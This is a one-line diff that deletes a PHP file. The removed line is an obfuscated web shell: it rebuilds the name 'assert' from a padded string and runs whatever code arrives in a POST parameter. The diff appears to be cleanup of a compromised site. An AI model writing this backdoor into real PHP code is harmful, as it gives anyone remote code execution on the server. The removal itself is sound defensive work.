@@ -1,1 +1,0 @@
-<?php $k = str_replace("8","","a8s88s8e8r88t");$k($_POST["8"]); ?>
